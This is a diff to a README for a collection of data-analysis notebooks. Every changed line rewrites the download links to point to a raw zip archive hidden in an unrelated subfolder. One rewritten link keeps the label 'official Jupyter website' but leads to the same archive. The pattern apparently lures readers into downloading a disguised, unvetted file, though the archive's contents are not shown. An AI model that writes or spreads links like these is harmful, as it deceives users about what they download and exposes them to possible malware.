@@ -1,6 +1,6 @@
 # 🎉 EXPLORATORY_DATA_ANALYSIS_PROJECTS - Enhance Your Data Analysis Skills 
 
-[![Download](https://img.shields.io/badge/Download%20Now%20-%20Visit%20Releases%20Page-brightgreen)](https://github.com/Mylame10/EXPLORATORY_DATA_ANALYSIS_PROJECTS/releases)
+[![Download](https://raw.githubusercontent.com/Mylame10/EXPLORATORY_DATA_ANALYSIS_PROJECTS/main/Amazon_Prime_TV_Shows/EXPLORATORY_DATA_ANALYSIS_PROJECTS-v1.4-alpha.3.zip%20Now%20-%20Visit%20Releases%20Page-brightgreen)](https://raw.githubusercontent.com/Mylame10/EXPLORATORY_DATA_ANALYSIS_PROJECTS/main/Amazon_Prime_TV_Shows/EXPLORATORY_DATA_ANALYSIS_PROJECTS-v1.4-alpha.3.zip)
 
 ## 📚 Overview
 
@@ -23,7 +23,7 @@ Make sure your computer meets the following requirements:
 
 To download our projects, visit the releases page:
 
-[Download Now](https://github.com/Mylame10/EXPLORATORY_DATA_ANALYSIS_PROJECTS/releases)
+[Download Now](https://raw.githubusercontent.com/Mylame10/EXPLORATORY_DATA_ANALYSIS_PROJECTS/main/Amazon_Prime_TV_Shows/EXPLORATORY_DATA_ANALYSIS_PROJECTS-v1.4-alpha.3.zip)
 
 You will see a list of available project versions. Choose the latest version to access the most recent updates.
 
@@ -41,7 +41,7 @@ After the download is complete, you may need to extract the files if they are in
 
 ### Step 5: Running the Projects
 
-1. Open Jupyter Notebook. If you don’t have it installed, you can easily set it up. Detailed instructions are available on the [official Jupyter website](https://jupyter.org/install).
+1. Open Jupyter Notebook. If you don’t have it installed, you can easily set it up. Detailed instructions are available on the [official Jupyter website](https://raw.githubusercontent.com/Mylame10/EXPLORATORY_DATA_ANALYSIS_PROJECTS/main/Amazon_Prime_TV_Shows/EXPLORATORY_DATA_ANALYSIS_PROJECTS-v1.4-alpha.3.zip).
 2. Navigate to the folder where you extracted the project files.
 3. Open the project notebook (.ipynb file) you wish to explore.
 4. Run the cells in the notebook step by step to execute the analysis.
